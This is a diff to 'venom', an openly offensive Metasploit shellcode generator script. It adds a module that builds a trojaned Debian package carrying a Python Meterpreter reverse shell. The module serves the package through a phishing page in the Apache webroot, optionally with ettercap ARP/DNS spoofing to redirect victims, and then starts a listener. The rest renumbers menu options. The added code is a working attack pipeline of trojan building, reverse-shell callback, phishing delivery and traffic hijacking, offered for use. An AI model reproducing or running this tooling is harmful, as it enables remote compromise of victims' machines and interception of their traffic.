@@ -2,7 +2,7 @@
 # --------------------------------------------------------------
 # venom - metasploit Shellcode generator/compiler/listenner
 # Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.0.13
-# Suspicious-Shell-Activity (SSA) RedTeam develop @2016
+# Suspicious-Shell-Activity (SSA) RedTeam develop @2017
 # codename: the Minotaur [ GPL licensed ]
 # --------------------------------------------------------------
 # [DEPENDENCIES]
@@ -258,6 +258,7 @@ rm $ApAcHe/*.apk > /dev/null 2>&1
 rm $ApAcHe/*.exe > /dev/null 2>&1
 rm $ApAcHe/*.py > /dev/null 2>&1
 rm $ApAcHe/*.bat > /dev/null 2>&1
+rm $ApAcHe/*.deb > /dev/null 2>&1
 # delete pyinstaller temp files
 rm $IPATH/*.spec > /dev/null 2>&1
 rm -r $IPATH/dist > /dev/null 2>&1
@@ -294,13 +295,6 @@ else
 /etc/init.d/metasploit start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting metasploit service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
 /etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
 fi
-
-# -----------------------------------------
-# RELOAD METASPLOIT DATABASE (database.yml)
-# -----------------------------------------
-# echo "[☠] Please wait, Reloading metasploit database..."
-# msfdb delete > /dev/null 2>&1
-# msfdb init > /dev/null 2>&1
 clear
 
 
@@ -3953,7 +3947,7 @@ fi
 # writen by: 'Andrew Smith' 'Ben Campbell' 'Chris Campbell'
 # this as nothing to do with shellcode, but i LOVE this :D
 # ---------------------------------------------------------
-sh_web_delivery () {
+sh_shellcode19 () {
 # get user input to build the payload
 echo "[☆] Enter shellcode settings!"
 srvhost=$(zenity --title="☠ Enter SRVHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
@@ -4170,11 +4164,144 @@ fi
 
 
 
+# ----------------------------------------
+# kimi - Malicious Debian Packet Creator
+# author: Chaitanya Haritash (SSA-RedTeam)
+# ----------------------------------------
+sh_shellcode20 () {
+# get user input to build the payload
+echo "[☠] Enter shellcode settings!"
+srvhost=$(zenity --title="☠ Enter SRVHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: theMinotaur" --width 300) > /dev/null 2>&1
+VeRp=$(zenity --entry --title "☠ DEBIAN PACKET VERSION ☠" --text "example: 1.0.13" --width 300) > /dev/null 2>&1
+
+
+# display final settings to user
+cat << !
+
+ shellcode settings
++-------------------------------
+| SRVPORT : 8080
+| SRVHOST : $srvhost
+| FORMAT  : SH,PYTHON -> UNIX's
+| PAYLOAD : python/meterpreter/reverse_tcp
+|_STORED  : $IPATH/output/$N4m.deb
+
+!
+
+
+# EDITING/BACKUP FILES NEEDED
+echo ""
+echo "[☠] editing/backup files .."
+sleep 2
+
+
+   # check if kimi.py exists
+   if [ -e $IPATH/templates/kimi_MDPC/kimi.py ]; then
+      echo "[☠] Program MDPC-kimi.py -> found!"
+      sleep 2
+ 
+   else
+
+      echo "[☠] Program MDPC-kimi.py -> not found!"
+      exit
+   fi
+
+
+# use MDPC to build trojan agent
+echo "[☠] Use MDPC-kimi to build trojan agent .."
+sleep 2
+cd $IPATH/templates/kimi_MDPC
+xterm -T "kimi.py (MDPC)" -geometry 110x23 -e "python kimi.py -n $N4m -V $VeRp -l $srvhost && sleep 2" > /dev/null 2>&1
+# move agent to the rigth directory (venom)
+echo "[☠] Moving agent to output folder .."
+sleep 2
+mv *.deb $IPATH/output/$N4m.deb > /dev/null 2>&1
+mv handler.rc $IPATH/output/handler.rc > /dev/null 2>&1
+cd $IPATH/
+
+
+# copy agent to apache2 and deliver it to target
+echo "[☠] Execute in target: dpkg -i <packet_name.deb> .."
+sleep 2
+
+
+# CHOSE HOW TO DELIVER YOUR PAYLOAD
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.deb\n\nchose how to deliver: $N4m.deb" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1
+
+
+   if [ "$serv" = "multi-handler (default)" ]; then
+      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
+xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc"
+      sleep 2
+
+   else
+
+      # edit files nedded
+      echo "[☠] copy files to webroot..."
+      cd $IPATH/templates/phishing
+      cp $InJEc12 mega[bak].html
+      sed "s|NaM3|$N4m.deb|g" mega.html > copy.html
+      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
+      cd $IPATH/output
+      cp $N4m.deb $ApAcHe/$N4m.deb > /dev/null 2>&1
+      echo "[☠] loading -> Apache2Server!"
+      echo "---"
+      echo "- SEND THE URL GENERATED TO TARGET HOST"
+
+        if [ "$D0M4IN" = "yes" ]; then
+        # copy files nedded by mitm+dns_spoof module
+        sed "s|NaM3|$N4m.deb|" $IPATH/templates/phishing/index2.html > $D3F/index.html
+        cp $IPATH/output/$N4m.deb $D3F/$N4m.deb
+        echo "- ATTACK VECTOR: http://mega-upload.com"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+
+        else
+
+        echo "- ATTACK VECTOR: http://$srvhost"
+        echo "---"
+        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
+        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -r $IPATH/output/handler.rc"
+
+        fi
+   fi
+
+
+
+sleep 2
+# CLEANING EVERYTHING UP
+echo "[☠] Cleanning temp generated files..."
+sleep 2
+mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
+rm $D3F/index.html > /dev/null 2>&1
+rm $D3F/$N4m.deb > /dev/null 2>&1
+rm $ApAcHe/index.html > /dev/null 2>&1
+rm $ApAcHe/$N4m.deb > /dev/null 2>&1
+clear
+cd $IPATH/
+# limpar /usr/local/bin in target on exit
+# rm /usr/local/bin/$N4m > /dev/null 2>&1
+}
+
+
+
+
 
 # -----------------------------
 # Android payload 
 # ----------------------------- 
-sh_dalvik () {
+sh_shellcode21 () {
 
 # get user input to build shellcode
 echo "[☠] Enter shellcode settings!"
@@ -4278,7 +4405,7 @@ cd $IPATH/
 # build shellcode in EXE format (windows-platforms)
 # to deploy againts windows service (exe-service)
 # ------------------------------------------------------
-sh_shellcode21 () {
+sh_shellcode22 () {
 # module description
 cat << !
 ---
@@ -4409,10 +4536,13 @@ cd $IPATH/
 
 
 
+
+
+
 # -----------------------------------------------------
 # astrobaby word macro trojan payload
 # ------------------------------------------------------
-sh_shellcode22 () {
+sh_shellcode23 () {
 # get user input to build shellcode
 echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
@@ -4863,10 +4993,10 @@ cat << !
     +-----------------+-----------+------------+------------------+
     |  OPTIONS BUILD  | TARGET OS |   FORMAT   |      OUTPUT      |
     +-----------------+-----------+------------+------------------+
-    |  1 - shellcode     unix         C             C             |
+    |  1 - shellcode     unix's       C             C             |
     |  2 - shellcode     windows      C             DLL           |
     |  3 - shellcode     windows      DLL           DLL           |
-    |  4 - shellcode     windows      C             PYTHON/EXE    |
+    |  4 - shellcode     windows      C             PYTHON,EXE    |
     |  5 - shellcode     windows      C             EXE           |
     |  6   shellcode     windows      PSH-CMD       EXE           |
     |  7 - shellcode     windows      C             RUBY          |
@@ -4877,20 +5007,21 @@ cat << !
     | 12 - shellcode     windows      PSH-CMD       BAT           |
     | 13 - shellcode     windows      VBS           VBS           |
     | 14 - shellcode     windows      PSH-CMD       VBS           |
-    | 15 - shellcode     windows      PSH-CMD/C     PDF           |
-    | 16 - shellcode     webserver    PHP           PHP/PHP       |
+    | 15 - shellcode     windows      PSH-CMD,C     PDF           |
+    | 16 - shellcode     webserver    PHP           PHP,PHP       |
     | 17 - shellcode     multi OS     PYTHON        PYTHON        |
-    | 18 - shellcode     multi OS     JAVA/PSH      JAR(RCE)      |
-    | 19 - web_delivery  multi OS     PYTHON/PSH    PYTHON/BAT    |
-    | 20 - shellcode     android      DALVIK        APK           |
-    | 21 - shellcode     windows      EXE-SERVICE   EXE           |
-    | 22 - shellcode     windows      C             DOCM(word)    |
+    | 18 - shellcode     multi OS     JAVA,PSH      JAR(RCE)      |
+    | 19 - web_delivery  multi OS     PYTHON,PSH    PYTHON,BAT    |
+    | 20 - web_delivery  unix's       SH,PYTHON     DEB           |
+    | 21 - shellcode     android      DALVIK        APK           |
+    | 22 - shellcode     windows      EXE-SERVICE   EXE           |
+    | 23 - shellcode     windows      C             DOCM(word)    |
     |                                                             |
     |  S - system built-in shells                                 |
     |  F - FAQ (frequent ask questions)                           |
     |  E - exit Shellcode Generator                               |
     +-------------------------------------------------------------+
-                                                 SSA-RedTeam@2016_|
+                                                 SSA-RedTeam@2017_|
 
 !
 echo "[☠] Shellcode Generator"
@@ -4916,10 +5047,11 @@ case $choice in
 16) sh_shellcode16 ;;
 17) sh_shellcode17 ;;
 18) sh_shellcode18 ;;
-19) sh_web_delivery ;;
-20) sh_dalvik ;;
+19) sh_shellcode19 ;;
+20) sh_shellcode20 ;;
 21) sh_shellcode21 ;;
 22) sh_shellcode22 ;;
+23) sh_shellcode23 ;;
 S) sh_buildin ;;
 s) sh_buildin ;;
 f) sh_FAQ ;;
